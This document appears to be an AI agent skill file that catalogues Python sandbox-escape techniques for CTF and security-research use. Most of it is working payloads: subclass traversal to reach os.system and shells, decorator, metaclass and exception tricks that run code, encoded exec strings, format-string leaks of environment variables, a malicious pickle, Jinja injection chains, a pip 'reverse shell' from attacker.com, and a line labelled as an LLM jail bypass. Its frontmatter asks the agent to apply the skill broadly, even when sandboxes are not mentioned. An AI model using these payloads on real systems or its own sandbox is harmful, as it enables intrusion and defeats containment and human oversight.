---
name: python-sandbox-escape
description: How to escape Python sandbox restrictions and gain code execution. Use this skill whenever the user mentions Python sandboxes, restricted Python environments, CTF challenges with Python jails, eval/exec restrictions, sandboxed code execution, or any scenario where Python code runs in a limited environment. This includes CTF writeups, security research, penetration testing, or debugging restricted Python environments. Make sure to use this skill even if the user doesn't explicitly say "sandbox" - if they mention restricted Python, eval-only environments, or Python CTF challenges, this skill is relevant.
---

# Python Sandbox Escape Techniques

This skill provides techniques for escaping Python sandbox restrictions and gaining arbitrary code execution in restricted Python environments. These methods are useful for CTF challenges, security research, and understanding Python's security model.

## When to Use This Skill

Use this skill when:
- Working on CTF challenges with Python sandbox restrictions
- Debugging restricted Python environments (eval-only, no imports, etc.)
- Security research on Python sandbox vulnerabilities
- Analyzing Python code execution in constrained environments
- Needing to understand Python's internal object model for exploitation

## Quick Reference: Command Execution Methods

### Direct Command Execution (if libraries available)

```python
# Standard methods
os.system("ls")
os.popen("ls").read()
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("/bin/bash")

# Via importlib
importlib.import_module("os").system("ls")
__import__("os").system("ls")

# Via sys.modules
sys.modules["os"].system("ls")
```

### File Operations

```python
# Read files
open("/etc/passwd").read()

# Write files
open('/var/www/html/input', 'w').write('123')
```

## Technique 1: Accessing Builtins

### When `__builtins__` is available

```python
__builtins__.__import__("os").system("ls")
__builtins__.__dict__['__import__']("os").system("ls")
__builtins__["open"]("/etc/passwd").read()
```

### When `__builtins__` is NOT available

Python still loads many modules in memory. Access them via:

```python
# From global functions
help.__call__.__builtins__
license.__call__.__builtins__
print.__self__

# From defined functions
get_flag.__globals__['__builtins__']

# From loaded classes (Python 2 & 3)
__builtins__ = [x for x in (1).__class__.__base__.__subclasses__() 
                if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
__builtins__["__import__"]('os').system('ls')
```

## Technique 2: Accessing Subclasses

Access `__subclasses__()` from various objects:

```python
# Multiple ways to reach subclasses
"".__class__.__base__.__subclasses__()
[].__class__.__base__.__subclasses__()
{}.__class__.__base__.__subclasses__()
().__class__.__base__.__subclasses__()
(1).__class__.__base__.__subclasses__()

# Without __base__ or __class__
"".__class__.__bases__[0].__subclasses__()
"".__class__.__mro__[1].__subclasses__()

# Without making calls (for decorator-based escapes)
().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]()
```

## Technique 3: Finding Dangerous Libraries

Search for loaded modules that contain dangerous libraries:

```python
# Find modules with 'os' in globals
[x.__init__.__globals__ for x in "".__class__.__base__.__subclasses__() 
 if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__][0]["os"].system("ls")

# Find modules with 'subprocess'
[x for x in "".__class__.__base__.__subclasses__() 
 if x.__name__ == 'Popen'][0]('ls')

# Find modules with 'sys'
[x.__init__.__globals__ for x in "".__class__.__base__.__subclasses__() 
 if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__][0]["sys"].modules["os"].system("ls")
```

### Comprehensive Search Script

Use `scripts/find_dangerous_libs.py` to automatically search for dangerous libraries and functions in loaded modules.

## Technique 4: Execution Without Calls

### Using Decorators

```python
# Decorator-based RCE
@exec
@input
class X:
    pass

# Without input()
@eval
@'__import__("os").system("sh")'.format
class _:
    pass
```

### Using Magic Methods

```python
class RCE:
    def __init__(self):
        self += "print('Hello from __init__ + __iadd__')"
    __iadd__ = exec  # Triggered when object is created
    def __del__(self):
        self -= "print('Hello from __del__ + __isub__')"
    __isub__ = exec  # Triggered when object is created
    __getitem__ = exec  # Triggered with obj[<argument>]
    __add__ = exec  # Triggered with obj + <argument>

# Trigger RCE
rce = RCE()
rce["print('Hello from __getitem__')"]
rce + "print('Hello from __add__')"
del rce

# Trigger on exit
sys.modules["pwnd"] = RCE()
exit()
```

### Using Metaclasses

```python
class Metaclass(type):
    __getitem__ = exec

class Sub(metaclass=Metaclass):
    pass

Sub['import os; os.system("sh")']
```

### Using Exceptions

```python
class RCE(Exception):
    def __init__(self):
        self += 'import os; os.system("sh")'
    __iadd__ = exec

raise RCE  # Generate RCE object

# Alternative with try/except
class Klecko(Exception):
    __add__ = exec

try:
    raise Klecko
except Klecko as k:
    k + 'import os; os.system("sh")'  # RCE abusing __add__
```

## Technique 5: Encoding Bypasses

### Hex/Octal/Base64

```python
# Octal
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")

# Hex
exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")

# Base64
exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
```

### UTF-7 Encoding

```python
assert b"+AAo-".decode("utf_7") == "\n"

payload = """
# -*- coding: utf_7 -*-
def f(x):
    return x
    #+AAo-print(open("/flag.txt").read())
""".lstrip()
```

## Technique 6: Eval/Exec Tricks

### Bypassing eval Limitations

```python
# eval doesn't allow ";" but compile does
eval(compile('print("hello world"); print("heyy")', '<stdin>', 'exec'))

# Walrus operator for multi-line in eval
[a:=21, a*2]

# timeit for execution
__import__('timeit').timeit("__import__('os').system('ls')", number=1)
```

### Pandas Query Injection

```python
import pandas as pd
df = pd.read_csv("currency-rates.csv")
df.query('@__builtins__.__import__("os").system("ls")')
df.query("@pd.io.common.os.popen('ls').read()")
```

## Technique 7: Format String Exploitation

### Accessing Internal Objects

```python
# Access globals through format strings
st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
get_name_for_avatar(st, people_obj=people)

# Access __dict__
get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj=people)

# Use !s, !r, !a for str/repr/ascii
st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
```

### Sensitive Information Disclosure

```python
{whoami.__class__.__dict__}
{whoami.__globals__[os].__dict__}
{whoami.__globals__[os].environ}
{whoami.__globals__[sys].path}
{whoami.__globals__[sys].modules}
```

### Format String to RCE

```python
# Load library via ctypes gadget
'{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
```

## Technique 8: Function Dissection

### Accessing Function Code

```python
# Get code object
get_flag.__code__

# Get constants (includes strings, numbers)
get_flag.__code__.co_consts

# Get variable names
get_flag.__code__.co_varnames

# Get bytecode
get_flag.__code__.co_code

# Disassemble (if dis available)
import dis
dis.dis(get_flag)
```

### Recreating Functions

```python
# Get code type
code_type = type((lambda: None).__code__)

# Recreate code object
fc = get_flag.__code__
code_obj = code_type(fc.co_argcount, fc.co_kwonlyargcount, fc.co_nlocals, 
                     fc.co_stacksize, fc.co_flags, fc.co_code, fc.co_consts,
                     fc.co_names, fc.co_varnames, fc.co_filename, fc.co_name,
                     fc.co_firstlineno, fc.co_lnotab, cellvars=fc.co_cellvars,
                     freevars=fc.co_freevars)

# Execute
mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
```

## Technique 9: Pickle Exploitation

### Creating Malicious Pickle

```python
import pickle, os, base64, pip

class P(object):
    def __reduce__(self):
        return (pip.main, (["list"],))

print(base64.b64encode(pickle.dumps(P(), protocol=0)))
```

### Reverse Shell via Pip

```bash
pip install http://attacker.com/Reverse.tar.gz
pip.main(["install", "http://attacker.com/Reverse.tar.gz"])
```

## Technique 10: Globals and Locals Discovery

```python
# Check what's available
globals()
locals()

# From defined functions
get_flag.__globals__

# From class objects
class_obj.__init__.__globals__

# From loaded classes
[x for x in "".__class__.__base__.__subclasses__() if "__globals__" in dir(x)]
```

## Helper Scripts

### Find Dangerous Libraries

Run `scripts/find_dangerous_libs.py` to automatically search for dangerous libraries and functions in loaded modules:

```bash
python scripts/find_dangerous_libs.py
```

This script searches for:
- `os`, `subprocess`, `commands`, `pty`, `importlib`, `sys`, `builtins`, `pip`, `pdb`
- Functions: `system`, `popen`, `Popen`, `spawn`, `__import__`, `exec`, etc.

### Recursive Search for Builtins

Run `scripts/recursive_search.py` to recursively find places where builtins, globals, and dangerous objects can be accessed:

```bash
python scripts/recursive_search.py
```

This searches from:
- Empty strings
- Loaded subclasses
- Global functions

## Common CTF Patterns

### No Builtins, No MRO

```python
().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]()
```

### Django/Jinja attr() Access

```python
(''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
```

### LLM Jail Bypass

```python
().class.base.subclasses()[108].load_module('os').system('dir')
```

## Safety Notes

- These techniques are for **educational purposes** and **CTF challenges**
- Only use on systems you have permission to test
- Many of these techniques rely on specific Python versions and configurations
- Always verify the Python version and available modules before attempting exploits

## References

- [lbarman.ch/blog/pyjail/](https://lbarman.ch/blog/pyjail/)
- [ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
- [gynvael.coldwind.pl/n/python_sandbox_escape](https://gynvael.coldwind.pl/n/python_sandbox_escape)
- [nedbatchelder.com/blog/201206/eval_really_is_dangerous.html](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)
